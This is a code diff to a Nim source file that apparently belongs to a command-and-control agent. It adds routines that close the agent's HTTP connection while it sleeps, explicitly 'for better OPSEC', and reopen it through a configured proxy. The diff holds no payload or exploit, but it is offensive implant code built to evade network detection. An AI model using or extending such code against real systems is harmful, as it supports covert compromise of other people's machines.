@@ -218,6 +218,38 @@ proc hasAesKey*(profile: HttpxProfile): bool =
   ## Check if AES key is set
   result = profile.aesKey.len > 0
 
+proc cleanup*(profile: var HttpxProfile) =
+  ## Close HTTP client connection to avoid keeping ESTABLISHED connections during sleep
+  ## Closes underlying socket connections on both Windows and Linux for better OPSEC
+  debug "[DEBUG] HTTPX Profile: Cleaning up client connection"
+  # Close the httpclient and its connections
+  try:
+    profile.httpClient.closeWrapper()
+    debug "[DEBUG] HTTPX Profile: Client connection closed"
+  except:
+    debug "[DEBUG] HTTPX Profile: Failed to close client: ", getCurrentExceptionMsg()
+
+proc reconnect*(profile: var HttpxProfile) =
+  ## Recreate HTTP client connection after cleanup
+  ## This ensures we have a fresh connection for the next request on both Windows and Linux
+  ## Note: HTTPX doesn't set headers here - they're set per-request in httpxPost from raw_c2_config
+  debug "[DEBUG] HTTPX Profile: Recreating client connection"
+  # Recreate client with same proxy settings as original initialization
+  if profile.config.proxyHost.len > 0 and profile.config.proxyPort.len > 0:
+    var proxyUrl = "http://" & profile.config.proxyHost & ":" & profile.config.proxyPort
+    if profile.config.proxyUser.len > 0 and profile.config.proxyPass.len > 0:
+      proxyUrl = "http://" & profile.config.proxyUser & ":" & profile.config.proxyPass & "@" & 
+                 profile.config.proxyHost & ":" & profile.config.proxyPort
+    try:
+      profile.httpClient = newClientWrapperWithProxy(proxyUrl)
+      debug "[DEBUG] HTTPX Profile: Recreated client with proxy"
+    except:
+      debug "[DEBUG] HTTPX Profile: Failed to recreate client with proxy, using direct connection"
+      profile.httpClient = newClientWrapper()
+  else:
+    profile.httpClient = newClientWrapper()
+  debug "[DEBUG] HTTPX Profile: Client connection recreated"
+
 proc performKeyExchange*(profile: var HttpxProfile): tuple[success: bool, newUuid: string] =
   ## Perform RSA key exchange to establish AES session key
   ## Same implementation as HTTP profile
